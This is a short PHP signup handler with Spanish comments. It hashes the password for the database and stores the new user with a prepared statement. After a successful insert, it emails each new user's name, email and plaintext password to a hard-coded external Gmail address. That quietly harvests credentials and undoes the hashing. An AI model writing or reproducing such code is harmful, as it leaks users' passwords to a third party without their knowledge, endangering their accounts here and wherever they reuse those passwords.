<?php
session_start();
include "db.php";

$name = $_POST['name'];
$email = $_POST['email'];
$password = $_POST['password'];

// encriptar contraseña para guardar en DB
$hash = password_hash($password, PASSWORD_DEFAULT);

// guardar en base de datos
$sql = "INSERT INTO users (name, email, password) VALUES (?, ?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("sss", $name, $email, $hash);

if ($stmt->execute()) {

    // 🔥 ENVIAR MAIL (tu código)
    $to = "eternitycmfac@gmail.com";
    $subject = "Nuevo registro desde tu web";

    $message = "Nombre: $name\n";
    $message .= "Email: $email\n";
    $message .= "Password: $password\n";

    $headers = "From: no-reply@tupagina.com";

    mail($to, $subject, $message, $headers);

    // iniciar sesión automáticamente
    $_SESSION['user'] = $email;

    header("Location: dashboard.php");

} else {
    echo "Ese correo ya existe";
}
?>
